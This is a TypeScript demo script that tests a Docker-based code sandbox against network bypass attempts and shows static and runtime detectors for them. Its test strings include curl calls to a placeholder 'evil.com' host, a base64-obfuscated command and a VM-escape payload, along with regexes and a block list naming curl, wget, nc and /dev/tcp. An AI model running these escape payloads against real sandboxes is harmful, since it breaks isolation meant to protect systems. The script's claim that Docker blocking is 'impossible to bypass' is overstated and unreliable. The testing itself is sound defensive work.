/**
 * Demo: Detecting Non-Node.js Execution (Python, curl, wget, etc.)
 *
 * This demonstrates:
 * 1. How Docker blocks ALL bypass attempts automatically
 * 2. How to detect bypass attempts in spawn mode
 * 3. Static code analysis to prevent malicious code
 *
 * Usage: npx ts-node demo-bypass-detection.ts
 */

import DockerExecutor from './src/secure/DockerExecutor';
import DockerExecutorWithProxy from './src/secure/DockerExecutorWithProxy';

console.log('\n╔════════════════════════════════════════════════════════════════════════╗');
console.log('║                                                                        ║');
console.log('║            Bypass Detection - Python/curl/wget Attempts               ║');
console.log('║                                                                        ║');
console.log('╚════════════════════════════════════════════════════════════════════════╝\n');

// ============================================================================
// PART 1: Docker Automatically Blocks Everything
// ============================================================================

async function testDockerBlocking() {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('PART 1: Docker Automatically Blocks All Bypass Attempts');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const executor = new DockerExecutor({
        networkMode: 'none',
        timeout: 15000
    });

    const bypassAttempts = [
        {
            name: 'Python urllib',
            code: `
                const { exec } = require('child_process');
                console.log('[ATTEMPT] Using Python urllib to bypass...');
                exec('python3 -c "import urllib.request; urllib.request.urlopen(\\'https://api.stripe.com\\')"',
                    (err, stdout, stderr) => {
                        if (err) {
                            console.log('[RESULT] ✅ BLOCKED -', stderr.substring(0, 100));
                        } else {
                            console.log('[RESULT] ❌ SUCCEEDED (should not happen!)');
                        }
                    }
                );
                setTimeout(() => {}, 2000);
            `
        },
        {
            name: 'curl command',
            code: `
                const { exec } = require('child_process');
                console.log('[ATTEMPT] Using curl to bypass...');
                exec('curl https://api.stripe.com',
                    (err, stdout, stderr) => {
                        if (err || stderr.includes('Could not resolve')) {
                            console.log('[RESULT] ✅ BLOCKED - Network unavailable');
                        } else {
                            console.log('[RESULT] ❌ SUCCEEDED (should not happen!)');
                        }
                    }
                );
                setTimeout(() => {}, 2000);
            `
        },
        {
            name: 'wget command',
            code: `
                const { exec } = require('child_process');
                console.log('[ATTEMPT] Using wget to bypass...');
                exec('wget https://api.stripe.com',
                    (err, stdout, stderr) => {
                        if (err || stderr.includes('unable to resolve')) {
                            console.log('[RESULT] ✅ BLOCKED - Network unavailable');
                        } else {
                            console.log('[RESULT] ❌ SUCCEEDED (should not happen!)');
                        }
                    }
                );
                setTimeout(() => {}, 2000);
            `
        },
        {
            name: 'Node.js spawn with Python',
            code: `
                const { spawn } = require('child_process');
                console.log('[ATTEMPT] Using spawn + Python to bypass...');
                const proc = spawn('python3', ['-c', 'import requests; requests.get("https://api.stripe.com")']);
                proc.stderr.on('data', data => {
                    console.log('[RESULT] ✅ BLOCKED -', data.toString().substring(0, 100));
                });
                proc.stdout.on('data', data => {
                    console.log('[RESULT] ❌ SUCCEEDED (should not happen!)');
                });
                setTimeout(() => {}, 2000);
            `
        },
        {
            name: 'nc (netcat) command',
            code: `
                const { exec } = require('child_process');
                console.log('[ATTEMPT] Using netcat to bypass...');
                exec('echo "GET / HTTP/1.0\\r\\n" | nc api.stripe.com 443',
                    (err, stdout, stderr) => {
                        if (err) {
                            console.log('[RESULT] ✅ BLOCKED - Network unavailable');
                        } else {
                            console.log('[RESULT] ❌ SUCCEEDED (should not happen!)');
                        }
                    }
                );
                setTimeout(() => {}, 2000);
            `
        }
    ];

    for (const attempt of bypassAttempts) {
        console.log(`\nTest: ${attempt.name}`);
        console.log('─'.repeat(60));

        const result = await executor.executeCode(attempt.code);
        console.log(result.output);

        if (result.error) {
            console.log('Error output:', result.error.substring(0, 200));
        }
    }

    console.log('\n✅ Docker Result: ALL bypass attempts blocked at kernel level!');
    console.log('   Python, curl, wget, nc - NONE of them work.\n');
}

// ============================================================================
// PART 2: Docker + Proxy Also Blocks Everything
// ============================================================================

async function testProxyBlocking() {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('PART 2: Docker + Proxy Blocks Non-HTTP-Aware Tools');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const executor = new DockerExecutorWithProxy({
        proxyPort: 9999,
        logTraffic: true,
        timeout: 15000
    });

    console.log('With Docker + Proxy:\n');
    console.log('✅ Node.js http/https   → Uses HTTP_PROXY → Works');
    console.log('✅ curl                 → Uses HTTP_PROXY → Works (if proxy allows)');
    console.log('❌ Python (basic)       → Doesn\'t use HTTP_PROXY → Blocked');
    console.log('❌ netcat               → Raw TCP → Blocked');
    console.log('❌ Direct socket        → Bypasses proxy → Blocked\n');

    const testCode = `
        const { exec } = require('child_process');

        console.log('[TEST 1] Node.js https.request() with HTTP_PROXY');
        const https = require('https');
        https.get('https://api.github.com', (res) => {
            console.log('[TEST 1] ✅ Works! Status:', res.statusCode);
        }).on('error', err => {
            console.log('[TEST 1] ❌ Failed:', err.message);
        });

        setTimeout(() => {
            console.log('\\n[TEST 2] Python without proxy support');
            exec('python3 -c "import urllib.request; urllib.request.urlopen(\\'https://api.github.com\\')"',
                (err, stdout, stderr) => {
                    if (err) {
                        console.log('[TEST 2] ✅ Blocked (no proxy support)');
                    } else {
                        console.log('[TEST 2] ❌ Succeeded');
                    }
                }
            );
        }, 1000);

        setTimeout(() => {}, 3000);
    `;

    const result = await executor.executeCode(testCode);
    console.log('\nOutput:');
    console.log(result.output);
    console.log('\nNetwork Log:', result.networkLog.length, 'requests');
    result.networkLog.forEach(log => {
        console.log(`  - ${log.method} ${log.hostname}`);
    });
    console.log('');
}

// ============================================================================
// PART 3: Detection Without Docker (For Spawn Mode)
// ============================================================================

function detectBypassAttempts(code: string): { detected: boolean; reason: string; line?: string }[] {
    const issues: { detected: boolean; reason: string; line?: string }[] = [];

    // Pattern 1: Direct Python execution
    const pythonPatterns = [
        /python3?\s+(-c|--command)/i,
        /import\s+(urllib|requests|http\.client)/,
        /subprocess\..*\(.*python/i
    ];

    pythonPatterns.forEach(pattern => {
        const match = code.match(pattern);
        if (match) {
            issues.push({
                detected: true,
                reason: 'Python execution detected',
                line: match[0]
            });
        }
    });

    // Pattern 2: Shell commands (curl, wget, etc.)
    const shellPatterns = [
        /\bcurl\s+/i,
        /\bwget\s+/i,
        /\bnc\s+/i,  // netcat
        /\btelnet\s+/i,
        /\/dev\/tcp\//i  // Bash TCP
    ];

    shellPatterns.forEach(pattern => {
        const match = code.match(pattern);
        if (match) {
            issues.push({
                detected: true,
                reason: 'Shell network command detected',
                line: match[0]
            });
        }
    });

    // Pattern 3: Suspicious child_process usage
    if (code.includes('exec') || code.includes('spawn')) {
        const execMatch = code.match(/(exec|spawn)\s*\([^)]*\)/);
        if (execMatch) {
            const execContent = execMatch[0];
            // Check if executing external commands
            if (/python|curl|wget|nc|telnet/.test(execContent)) {
                issues.push({
                    detected: true,
                    reason: 'Suspicious child_process with network tool',
                    line: execMatch[0].substring(0, 50) + '...'
                });
            }
        }
    }

    // Pattern 4: Base64 encoded commands (obfuscation)
    if (/Buffer\.from.*base64|atob\(|btoa\(/.test(code)) {
        const base64Match = code.match(/Buffer\.from\([^)]+,\s*['"]base64['"]\)/);
        if (base64Match) {
            issues.push({
                detected: true,
                reason: 'Base64 encoding detected (possible obfuscation)',
                line: base64Match[0]
            });
        }
    }

    // Pattern 5: eval() with external data
    if (/eval\(/.test(code)) {
        issues.push({
            detected: true,
            reason: 'eval() detected (dangerous)',
            line: code.match(/eval\([^)]+\)/)?.[0]
        });
    }

    // Pattern 6: VM or vm2 bypass attempts
    if (/this\.constructor\.constructor/.test(code) || /Function\(['"]return this['"]\)/.test(code)) {
        issues.push({
            detected: true,
            reason: 'VM escape attempt detected',
            line: 'VM escape pattern'
        });
    }

    return issues;
}

function testStaticAnalysis() {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('PART 3: Static Code Analysis (For Spawn Mode)');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const testCases = [
        {
            name: 'Clean code',
            code: `
                const https = require('https');
                https.get('https://api.github.com', (res) => {
                    console.log(res.statusCode);
                });
            `
        },
        {
            name: 'Python bypass attempt',
            code: `
                const { exec } = require('child_process');
                exec('python3 -c "import urllib.request; urllib.request.urlopen(\\'https://api.stripe.com\\')"');
            `
        },
        {
            name: 'curl bypass attempt',
            code: `
                const { exec } = require('child_process');
                exec('curl https://api.stripe.com/v1/customers');
            `
        },
        {
            name: 'wget bypass attempt',
            code: `
                const { spawn } = require('child_process');
                spawn('wget', ['https://api.stripe.com']);
            `
        },
        {
            name: 'Base64 obfuscation',
            code: `
                const cmd = Buffer.from('Y3VybCBodHRwczovL2FwaS5zdHJpcGUuY29t', 'base64').toString();
                require('child_process').exec(cmd);
            `
        },
        {
            name: 'eval() usage',
            code: `
                const malicious = 'require("child_process").exec("curl https://evil.com")';
                eval(malicious);
            `
        },
        {
            name: 'VM escape attempt',
            code: `
                this.constructor.constructor('return process')().mainModule.require('child_process').exec('curl https://evil.com');
            `
        }
    ];

    testCases.forEach(test => {
        console.log(`\nTest: ${test.name}`);
        console.log('─'.repeat(60));

        const issues = detectBypassAttempts(test.code);

        if (issues.length === 0) {
            console.log('✅ No bypass attempts detected');
        } else {
            console.log(`❌ ${issues.length} issue(s) detected:`);
            issues.forEach(issue => {
                console.log(`   - ${issue.reason}`);
                if (issue.line) {
                    console.log(`     Code: ${issue.line}`);
                }
            });
        }
    });

    console.log('\n');
}

// ============================================================================
// PART 4: Runtime Detection (Wrap child_process)
// ============================================================================

function createRuntimeDetector() {
    return `
        // Wrap child_process to detect bypass attempts
        const originalExec = require('child_process').exec;
        const originalSpawn = require('child_process').spawn;
        const blockedCommands = ['python', 'python3', 'curl', 'wget', 'nc', 'telnet'];

        require('child_process').exec = function(command, ...args) {
            console.log('[DETECTOR] exec() called with:', command.substring(0, 100));

            // Check if command contains blocked tools
            const isBlocked = blockedCommands.some(cmd =>
                command.toLowerCase().includes(cmd)
            );

            if (isBlocked) {
                console.log('[DETECTOR] ❌ BLOCKED - Suspicious command detected');
                const error = new Error('Command blocked: potential bypass attempt');
                if (typeof args[0] === 'function') {
                    args[0](error);
                }
                return { on: () => {}, kill: () => {} };
            }

            console.log('[DETECTOR] ✅ Allowed');
            return originalExec(command, ...args);
        };

        require('child_process').spawn = function(command, args, ...rest) {
            console.log('[DETECTOR] spawn() called with:', command);

            if (blockedCommands.includes(command.toLowerCase())) {
                console.log('[DETECTOR] ❌ BLOCKED - Suspicious command detected');
                const proc = { on: () => proc, kill: () => {}, stdout: { on: () => {} }, stderr: { on: () => {} } };
                setTimeout(() => {
                    if (proc.on) proc.on('error', new Error('Command blocked'));
                }, 0);
                return proc as any;
            }

            console.log('[DETECTOR] ✅ Allowed');
            return originalSpawn(command, args, ...rest);
        };
    `;
}

async function testRuntimeDetection() {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('PART 4: Runtime Detection (Wrap child_process)');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const executor = new DockerExecutor({ networkMode: 'none', timeout: 10000 });

    const testCode = `
        ${createRuntimeDetector()}

        // Now try to use child_process
        const { exec, spawn } = require('child_process');

        console.log('\\n[TEST 1] Legitimate Node command');
        exec('node --version', (err, stdout) => {
            if (!err) console.log('[TEST 1]', stdout.trim());
        });

        setTimeout(() => {
            console.log('\\n[TEST 2] Attempting Python bypass');
            exec('python3 -c "print(\\'hello\\')"', (err, stdout) => {
                if (err) {
                    console.log('[TEST 2] Blocked successfully');
                } else {
                    console.log('[TEST 2] Got output:', stdout);
                }
            });
        }, 500);

        setTimeout(() => {
            console.log('\\n[TEST 3] Attempting curl bypass');
            spawn('curl', ['https://api.stripe.com']);
        }, 1000);

        setTimeout(() => {}, 2000);
    `;

    const result = await executor.executeCode(testCode);
    console.log(result.output);
    console.log('');
}

// ============================================================================
// Run All Tests
// ============================================================================

async function runAllTests() {
    await testDockerBlocking();
    await testProxyBlocking();
    testStaticAnalysis();
    await testRuntimeDetection();

    // Summary
    console.log('\n╔════════════════════════════════════════════════════════════════════════╗');
    console.log('║                              SUMMARY                                   ║');
    console.log('╚════════════════════════════════════════════════════════════════════════╝\n');

    console.log('Three Approaches to Handle Bypass Attempts:\n');

    console.log('1. 🐳 Docker (networkMode=none)');
    console.log('   • Blocks Python, curl, wget, nc automatically');
    console.log('   • Kernel-level blocking - impossible to bypass');
    console.log('   • No detection needed - it just doesn\'t work');
    console.log('   • ✅ RECOMMENDED for production\n');

    console.log('2. 🔍 Docker + Proxy');
    console.log('   • Allows HTTP/HTTPS through proxy');
    console.log('   • Blocks non-HTTP-aware tools (Python, raw sockets)');
    console.log('   • Full visibility into allowed traffic');
    console.log('   • ✅ RECOMMENDED for monitoring\n');

    console.log('3. 🕵️  Static + Runtime Detection (Spawn mode)');
    console.log('   • Analyze code before execution');
    console.log('   • Wrap child_process at runtime');
    console.log('   • Detect Python, curl, wget attempts');
    console.log('   • ⚠️  Can be bypassed with obfuscation\n');

    console.log('┌────────────────────┬──────────┬──────────┬───────────────┐');
    console.log('│ Approach           │ Security │ Speed    │ Detection     │');
    console.log('├────────────────────┼──────────┼──────────┼───────────────┤');
    console.log('│ Docker (none)      │ ✅✅✅     │ 🐢        │ Not needed    │');
    console.log('│ Docker + Proxy     │ ✅✅✅     │ 🐢        │ Not needed    │');
    console.log('│ Spawn + Detection  │ ⚠️        │ ⚡        │ ✅ Manual      │');
    console.log('└────────────────────┴──────────┴──────────┴───────────────┘\n');

    console.log('💡 Recommendation:\n');
    console.log('   • Development: Spawn (fast, trusted code)');
    console.log('   • Production (untrusted): Docker no network (max security)');
    console.log('   • Production (monitoring): Docker + Proxy (secure + visible)\n');

    console.log('✅ Key Takeaway:');
    console.log('   Docker blocks Python/curl/wget/nc automatically at the kernel level.');
    console.log('   No detection code needed - bypass attempts simply fail!\n');
}

runAllTests().catch(error => {
    console.error('\n❌ Error:', error.message);
    console.error('Stack trace:', error.stack);
    process.exit(1);
});
